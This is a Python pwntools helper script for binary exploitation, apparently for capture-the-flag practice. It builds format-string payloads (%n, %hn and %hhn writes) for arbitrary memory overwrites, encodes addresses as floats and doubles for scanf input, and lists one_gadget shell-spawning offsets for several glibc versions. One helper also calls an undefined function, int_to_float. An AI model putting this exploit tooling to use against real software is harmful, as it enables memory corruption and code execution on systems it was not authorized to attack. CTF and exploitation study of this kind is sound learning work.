#!/usr/bin/python3
# encoding: utf-8
from pwn import *

def to_float(data):
    return str(struct.unpack('f', p32(data))[0])

def write_8_bytes(data):
    r.sendline(int_to_float(data[:4]))
    r.sendline(int_to_float(data[4:]))


def to_double(data):
	return "%.800f " % struct.unpack("<d", p64(data))

def fsb(prev, value, idx, byte=1):
	ln  = "%{}c%{}$ln"
	n   = "%{}c%{}$n"
	hn  = "%{}c%{}$hn"
	hhn = "%{}c%{}$hhn"

	op = {1:hhn, 2:hn, 4:n, 8:ln}
	offset = {1: 0x100, 2: 0x10000, 4:0x100000000, 8:0x10000000000000000}
	if value > prev:
		return op[byte].format(value-prev, idx)
	elif value == prev:
		if byte==1:
			return "%{}$hhn".format(idx)
		elif byte == 2:
			return "%{}$hn".format(idx)
		elif byte == 4:
			return "%{}$n".format(idx)
		elif byte == 8:
			return "%{}$ln".format(idx)
	else:
		return op[byte].format(value-prev+offset[byte], idx)

one_gadget_23_32 = [0x3a80c, 0x3a80e, 0x3a812, 0x3a819, 0x5f065, 0x5f066]
one_gadget_23_64 = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget_24_64 = [0x3f306, 0x3f35a, 0xd6b9f]
one_gadget_27_32 = [0x3d0d3, 0x3d0d5, 0x3d0d9, 0x3d0e0, 0x67a7f, 0x67a80, 0x137e5e, 0x137e5f]
one_gadget_27_64 = [0x4f2c5, 0x4f322, 0x10a38c]
one_gadget_28_64 = [0x50186, 0x501e3, 0x103f50]
one_gadget_29_64 = [0xe237f, 0xe2383, 0xe2386, 0x106ef8]
one_gadget_30_64 = [0xcd31b, 0x147f9b, 0x147f9c]
one_gadget_31_64 = [0xc56ff]


# example
if __name__ == "__main__":
    target = 0x405678
    # scanf("%f", &target)
    print(to_float(target))
    
    # scanf("%lf", &target)
    print(to_double(target))
    
    
    # printf(payload)
    payload  = fsb(0, target&0xffff, 7, 2)
    payload += fsb(target&0xffff,       (target>>16)&0xffff, 7, 2)
    payload += fsb((target>>16)&0xffff, (target>>32)&0xffff, 7, 2)
    payload += fsb((target>>32)&0xffff, (target>>48)&0xffff, 7, 2)
    
    print(payload)
